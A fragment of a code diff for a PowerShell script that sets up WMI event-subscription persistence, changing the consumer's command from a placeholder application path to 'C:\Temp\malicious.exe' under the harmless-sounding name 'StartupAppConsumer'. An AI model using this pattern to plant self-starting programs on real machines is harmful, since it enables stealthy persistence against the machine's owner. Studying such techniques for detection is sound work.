@@ -111,7 +111,7 @@ $Filter = Set-CimInstance -Namespace root\subscription -ClassName __EventFilter 
 # 2. Create the Event Consumer (The EXE to run)
 $ConsumerArgs = @{
     Name = 'StartupAppConsumer'
-    CommandLineTemplate = 'C:\Path\To\Your\Application.exe'
+    CommandLineTemplate = 'C:\Temp\malicious.exe'
 }
 $Consumer = Set-CimInstance -Namespace root\subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs
 
